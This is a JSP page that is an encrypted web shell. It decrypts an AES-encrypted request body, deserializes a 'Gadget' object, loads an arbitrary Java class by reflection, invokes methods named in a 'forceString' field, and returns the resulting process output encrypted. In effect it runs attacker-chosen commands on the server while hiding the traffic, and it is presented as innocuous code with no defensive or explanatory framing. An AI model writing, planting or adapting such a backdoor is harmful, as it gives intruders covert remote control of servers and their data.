<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%@ page import="javax.crypto.SecretKey" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.security.spec.AlgorithmParameterSpec" %>
<%@ page import="javax.crypto.spec.IvParameterSpec" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public class Gadget implements Serializable {
        private static final long serialVersionUID = -1878443566818256475L;
        private String name;
        private List<Object> args;
        private HashMap<String, String> map;

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public List<Object> getArgs() {
            return args;
        }

        public void setArgs(List<Object> args) {
            this.args = args;
        }

        public HashMap<String, String> getMap() {
            return map;
        }

        public void setMap(HashMap<String, String> map) {
            this.map = map;
        }

        public String process() throws Exception{
            Class clazz = null;
            if(name == null && map == null) {
                throw new Exception("Initialized error.");
            }

            String methodName = null;
            try{
                clazz = Class.forName(name);
                Object obj = clazz.getConstructors()[0].newInstance(args);

                Method[] methods = clazz.getMethods();
                for(Method method : methods){
                    methodName = method.getName();

                    if(methodName.startsWith("set")){
                        String attr = methodName.substring(3);
                        if(map.get(attr) != null){
                            method.invoke(obj, attr);
                        }
                    }
                }

                List<Class<?>> superClass = new ArrayList();

                StringBuilder sb = new StringBuilder();
                for(Map.Entry<String, String> entry : map.entrySet()){
                    if(entry.getKey().equals("forceString")){
                        String value = entry.getValue();

                        Method invokeMethod = null;
                        Object target = null;
                        for(String param : value.split(",")){
                            param = param.trim();
                            invokeMethod = clazz.getMethod(param);
                            target = invokeMethod.invoke(obj);

                            InputStream in = (InputStream)target.getClass().getSuperclass().getMethod("getInputStream").invoke(target);
                            sb.append(getString(in));
                        }
                    }
                }
                return sb.toString();

            }catch(ClassNotFoundException e){
                throw new Exception("class name not found: " + name);
            }catch(NoSuchMethodException e){
                throw new Exception("Method invoke failed: " + methodName);
            }catch(Exception e){
                throw new Exception("Unexpected Exception, may be attribute not set properly.");
            }
        }

        public String getString(InputStream in) throws IOException {
            int len = 0;
            byte buffer[] = new byte[1024];
            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            while((len = in.read(buffer)) != -1){
                baos.write(buffer, 0, len);
            }

            return baos.toString().trim();
        }
    }
%>
<%!
    public static String encrypt(final String plaintext) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key, iv);
            byte[] result = cipher.doFinal(plaintext.getBytes("UTF-8"));
            return new sun.misc.BASE64Encoder().encode(result).replaceAll("\r|\n|\r\n", "");
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static String decrypt(final String encrypted) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            byte[] decodeBase64 = new sun.misc.BASE64Decoder().decodeBuffer(encrypted);
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, key, iv);
            return new String(cipher.doFinal(decodeBase64), "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
%>
<%
    BufferedReader br = request.getReader();
    String wholeStr = br.readLine();
    br.close();

    if(wholeStr != null && !wholeStr.trim().equals("")) {
        ByteArrayInputStream bis = new ByteArrayInputStream(Base64.getDecoder().decode(decrypt(wholeStr)));
        ObjectInputStream ois = new ObjectInputStream(bis);
        Gadget gadget = (Gadget)ois.readObject();
        response.getWriter().print(encrypt(gadget.process().trim()));
		bis.close();
		ois.close();
    }
%>